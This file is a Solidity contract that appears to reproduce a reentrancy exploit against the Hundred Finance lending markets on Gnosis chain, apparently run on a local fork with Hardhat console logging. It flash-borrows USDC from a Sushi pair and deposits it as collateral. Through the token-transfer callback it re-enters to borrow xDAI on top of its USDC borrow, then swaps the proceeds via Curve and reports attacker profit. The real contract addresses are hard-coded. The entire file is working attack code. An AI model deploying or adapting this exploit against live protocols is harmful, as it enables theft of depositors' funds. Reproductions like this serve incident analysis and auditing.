pragma solidity >=0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "hardhat/console.sol";

interface ICompoundToken {
    function borrow(uint256 borrowAmount) external;
    function repayBorrow(uint256 repayAmount) external;
    function redeem(uint256 redeemAmount) external;
    function mint(uint256 amount) external;
    function comptroller() external view returns(address);
}

interface IComptroller {
    function allMarkets() external view returns(address[] memory);
}

interface ICurve {
    function exchange(int128 i, int128 j, uint256 _dx, uint256 _min_dy) external;
}

interface IWeth {
    function deposit() external payable;
}

contract Hundred {

    IERC20 private constant usdc  = IERC20(0xDDAfbb505ad214D7b80b1f830fcCc89B60fb7A83);
    IERC20 private constant wxdai = IERC20(0xe91D153E0b41518A2Ce8Dd3D7944Fa863463a97d);

    address private constant husd = 0x243E33aa7f6787154a8E59d3C27a66db3F8818ee;
    address private constant hxdai = 0x090a00A2De0EA83DEf700B5e216f87a5D4F394FE;

    ICurve curve = ICurve(0x7f90122BF0700F9E7e1F688fe926940E8839F353);
    IUniswapV2Router02 private constant router = IUniswapV2Router02(0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506);


    uint totalBorrowed;
    bool xdaiBorrowed = false;

    constructor() public {}
    receive() external payable {}
    fallback() external payable {}

    function startAttack() public {
        borrow();
        console.log("Attacker Profit: %s usdc", usdc.balanceOf(address(this)));
    }

    function borrow() internal {
        IUniswapV2Factory factory = IUniswapV2Factory(router.factory());
        IUniswapV2Pair pair = IUniswapV2Pair(factory.getPair(address(wxdai), address(usdc)));
        uint borrowAmount = usdc.balanceOf(address(pair)) - 1;

        pair.swap(
            pair.token0() == address(wxdai) ? 0 : borrowAmount,
            pair.token0() == address(wxdai) ? borrowAmount : 0,
            address(this),
            abi.encode("0x")
        );
        
    }

    function uniswapV2Call(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data ) external {
        attackLogic(_amount0, _amount1, _data);
    }

    function attackLogic(uint256 _amount0, uint256 _amount1, bytes calldata _data ) internal {
        uint256 amountToken = _amount0 == 0 ? _amount1 : _amount0;
        totalBorrowed = amountToken;
        console.log("Borrowed: %s USDC from Sushi", usdc.balanceOf(address(this)));
        depositUsdc();
        borrowUsdc();
        swapXdai();
        uint amountRepay = ((amountToken * 1000) / 997) + 1;
        usdc.transfer(msg.sender, amountRepay);
        console.log("Repay Flashloan for : %s USDC", amountRepay);
    }


    function depositUsdc() internal {
        uint balance = usdc.balanceOf(address(this));
        usdc.approve(husd, balance);
        ICompoundToken(husd).mint(balance);
    }

    function borrowUsdc() internal {
        uint amount = (totalBorrowed * 90) / 100;
        ICompoundToken(husd).borrow(amount);
        console.log("Attacker USDC Balance After Borrow: %s USDC", usdc.balanceOf(address(this)));
        console.log("Hundred USDC Balance After Borrow: %s USDC", usdc.balanceOf(husd));

    }

    function borrowXdai() internal {
        xdaiBorrowed = true;
        uint amount = ((totalBorrowed * 1e12) * 60) / 100;

        ICompoundToken(hxdai).borrow(amount);
        console.log("Attacker xdai Balance After Borrow: %s XDAI", address(this).balance);
        console.log("Hundred xdai Balance After Borrow: %s Xdai", address(hxdai).balance);
    }

    function swapXdai() internal {
        IWeth(payable(address(wxdai))).deposit{value: address(this).balance}();
        wxdai.approve(address(curve), wxdai.balanceOf(address(this)));
        curve.exchange(0, 1, wxdai.balanceOf(address(this)), 1);
    }

    function onTokenTransfer(address _from, uint256 _value, bytes memory _data) external {
        IUniswapV2Factory factory = IUniswapV2Factory(router.factory());
        address pair = factory.getPair(address(wxdai), address(usdc));

        if(_from != pair && xdaiBorrowed == false){
            console.log("''i'm in!''");
            borrowXdai();
        }
    }
}
